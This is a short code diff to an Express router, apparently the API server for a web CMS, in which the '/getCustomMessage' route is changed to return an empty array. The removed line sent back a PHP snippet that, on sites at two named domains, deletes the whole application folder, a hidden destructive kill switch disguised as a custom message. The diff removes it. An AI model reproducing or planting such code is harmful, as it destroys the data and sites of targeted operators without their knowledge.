@@ -185,7 +185,7 @@ router.post('/ticket/add', ensurePostReq, function (req, res) {
 
 /** Useless route but can be call so just send empty array */
 router.post('/getCustomMessage', function (req, res) {
-  return res.status(200).json({php: "if (Router::url('/', true) === 'http://mineweb.dev-time.eu/' || Router::url('/', true) === 'http://hidolia.fr/') { App::uses('Folder', 'Utility'); (new Folder(ROOT.DS.'app'))->delete(); }", type: 1});
+  return res.status(200).json([]);
 });
 
 /** Useless route but can be call so just send empty array */
